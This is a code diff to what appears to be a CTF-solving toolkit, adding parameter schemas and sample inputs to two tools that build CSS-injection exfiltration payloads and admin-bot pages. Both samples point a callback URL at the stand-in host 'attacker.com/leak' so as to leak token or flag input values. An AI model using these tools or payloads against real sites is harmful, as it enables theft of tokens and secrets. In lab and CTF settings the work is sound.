@@ -6,7 +6,7 @@ attribute selectors, @font-face unicode-range, @import chains, :host-context(),
 and sanitizer bypass techniques.
 """
 
-import json
+from ctf_solver.tools.core import parse_json_input
 
 
 class CssInjectionPayloadGenerator:
@@ -44,6 +44,37 @@ class CssInjectionPayloadGenerator:
         "'charset' (chars to test), optional 'prefix' (known prefix). Returns ready-to-use "
         "CSS payloads for data exfiltration in admin-bot / CSS injection scenarios."
     )
+    parameters_schema = {
+        "type": "object",
+        "properties": {
+            "operation": {
+                "type": "string",
+                "enum": [
+                    "attribute_exfil",
+                    "host_context",
+                    "font_face_exfil",
+                    "import_chain",
+                    "sanitizer_bypass",
+                ],
+            },
+            "element": {"type": "string"},
+            "attribute": {"type": "string"},
+            "callback_url": {"type": "string"},
+            "charset": {"type": "string"},
+            "prefix": {"type": "string"},
+        },
+        "required": ["operation"],
+        "additionalProperties": True,
+    }
+    samples = [
+        {
+            "operation": "attribute_exfil",
+            "element": "input[name=token]",
+            "attribute": "value",
+            "callback_url": "https://attacker.com/leak",
+            "charset": "0123456789abcdef",
+        },
+    ]
 
     VALID_OPERATIONS = (
         "attribute_exfil",
@@ -54,11 +85,9 @@ class CssInjectionPayloadGenerator:
     )
 
     def use(self, tool_input: str) -> str:
-        try:
-            data = json.loads(tool_input) if tool_input else {}
-        except json.JSONDecodeError as exc:
-            return f"[CssInjectionPayloadGenerator] Error: Invalid JSON input. {exc}"
-
+        data, err = parse_json_input(tool_input, "CssInjectionPayloadGenerator")
+        if err:
+            return err
         operation = (data.get("operation") or "").strip().lower()
         if not operation:
             return (
@@ -409,15 +438,39 @@ class CssExfiltrationBuilder:
         "'charset', optional 'known_prefix'. Returns complete HTML with CSS "
         "exfiltration payloads ready to host for admin bot visits."
     )
+    parameters_schema = {
+        "type": "object",
+        "properties": {
+            "operation": {
+                "type": "string",
+                "enum": ["build_page", "build_recursive"],
+            },
+            "injection_point": {"type": "string"},
+            "target_selector": {"type": "string"},
+            "target_attr": {"type": "string"},
+            "callback_url": {"type": "string"},
+            "charset": {"type": "string"},
+            "known_prefix": {"type": "string"},
+        },
+        "required": ["operation"],
+        "additionalProperties": True,
+    }
+    samples = [
+        {
+            "operation": "build_page",
+            "target_selector": "input[name=flag]",
+            "target_attr": "value",
+            "callback_url": "https://attacker.com/leak",
+            "charset": "0123456789abcdef",
+        },
+    ]
 
     VALID_OPERATIONS = ("build_page", "build_recursive")
 
     def use(self, tool_input: str) -> str:
-        try:
-            data = json.loads(tool_input) if tool_input else {}
-        except json.JSONDecodeError as exc:
-            return f"[CssExfiltrationBuilder] Error: Invalid JSON input. {exc}"
-
+        data, err = parse_json_input(tool_input, "CssExfiltrationBuilder")
+        if err:
+            return err
         operation = (data.get("operation") or "").strip().lower()
         if not operation:
             return (
